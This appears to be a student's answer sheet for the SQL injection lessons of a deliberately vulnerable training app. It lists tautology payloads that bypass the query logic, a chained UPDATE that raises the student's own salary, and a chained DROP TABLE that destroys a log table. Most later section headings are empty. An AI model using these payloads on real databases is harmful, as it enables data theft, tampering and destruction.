Introduction
General
-----------------------------
(A1) Inection | SQL Injection
2. Try to retrieve the department of the employee Bob Franco. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.
SELECT department from employees where first_name='Bob'
3. Try to change the department of Tobi Barnett to 'Sales'. Note that you have been granted full administrator privileges in this assignment and can access all data without authentication.
UPDATE employees SET department='Sales' WHERE first_name='Tobi'
4. Now try to modify the scheme by adding the column "phone" (varchar(20)) to the table "employees". :
ALTER TABLE employees ADD COLUMN phone varchar(20);
5. Try to grant the usergroup "UnauthorizedUser" the right to alter tables:
GRANT ALTER TABLE TO UnauthorizedUser;
9. The query in the code builds a dynamic query as seen in the previous example. The query is build by concatenating strings making it susceptible to String SQL injection:
"SELECT * FROM user_data WHERE first_name = 'John' AND last_name = '" + lastName + "'";
SELECT * FROM user_data WHERE first_name = 'John' AND last_name = 
Your query was: SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or '1' = '1'
Explanation: This injection works, because or '1' = '1' always evaluates to true (The string ending literal for '1 is closed by the query itself, so you should not inject it). So the injected query basically looks like this: SELECT * FROM user_data WHERE first_name = 'John' and last_name = '' or TRUE, which will always evaluate to true, no matter what came before it.
10. Numeric SQL injection.
The query in the code builds a dynamic query as seen in the previous example. The query in the code builds a dynamic query by concatenating a number making it susceptible to Numeric SQL injection:
"SELECT * FROM user_data WHERE login_count = " + Login_Count + " AND userid = "  + User_ID;
Solution:
SELECT * From user_data WHERE Login_Count = 1 and userid= 0 OR 1 = 1
11. Compromising confidentiality with String SQL injection.
"SELECT * FROM employees WHERE last_name = '" + name + "' AND auth_tan = '" + auth_tan + "';
Employee Name: 1
Authentication TAN: ' OR '1' = '1
12. Compromising Integrity with Query chaining.
After compromising the confidentiality of data in the previous lesson, this time we are gonna compromise the integrity of data by using SQL query chaining.
The integrity of any data can be compromised, if an attacker per example changes information that he should not even be able to access.
You just found out that Tobi and Bob both seem to earn more money than you! Of course you cannot leave it at that.
Better go and change your own salary so you are earning the most!
Remember: Your name is John Smith and your current TAN is 3SL99A.
Solution:
Employee Name: SL99A'
Authntication TAN: UPDATE Employees set SALARY = 90000 where USERID = 37648 --
13. Compromising Availability
Solution:
Smith' ; drop table access_log --
-----------------------------
(2) Broken Authentication
-----------------------------
(3) Sensitive Data Exposure
-----------------------------
(4) XML Enternal Entities XXE
-----------------------------
(5) Broken Acess Control
-----------------------------
(6) Cross Site Scripting XSS
-----------------------------
(7) Insecure Deseialization
-----------------------------
(8) Vulnerable Components
-----------------------------
(9) Reuqest Forgeries
-----------------------------
Client Side
-----------------------------
Challenges
-----------------------------
